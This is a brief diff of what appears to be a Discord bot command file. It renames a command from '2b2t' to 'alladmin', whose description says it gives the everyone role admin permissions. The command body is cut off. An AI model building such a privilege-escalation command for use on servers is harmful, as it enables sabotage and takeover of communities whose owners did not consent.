@@ -1,5 +1,5 @@
 module.exports = {
-	name: '2b2t',
+	name: 'alladmin',
 	description: 'Gives The Everyone Role Admin Perms',
 	execute(message, args) {
 
